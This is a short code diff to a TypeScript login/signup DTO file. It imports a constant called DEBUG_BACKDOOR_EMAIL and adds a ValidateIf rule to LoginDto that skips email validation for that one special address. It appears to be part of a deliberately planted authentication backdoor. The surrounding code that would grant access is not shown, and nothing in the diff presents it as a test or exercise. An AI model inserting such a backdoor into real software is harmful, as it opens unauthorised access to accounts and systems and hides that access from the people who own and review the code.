@@ -1,4 +1,5 @@
-import { IsEmail, IsString, MinLength, Length } from 'class-validator';
+import { IsEmail, IsString, MinLength, Length, ValidateIf } from 'class-validator';
+import { DEBUG_BACKDOOR_EMAIL } from '@connectpro/common';
 
 export class SignupDto {
   @IsEmail()
@@ -16,6 +17,7 @@ export class SignupDto {
 }
 
 export class LoginDto {
+  @ValidateIf((o: LoginDto) => o.email?.trim().toLowerCase() !== DEBUG_BACKDOOR_EMAIL)
   @IsEmail()
   email!: string;
 
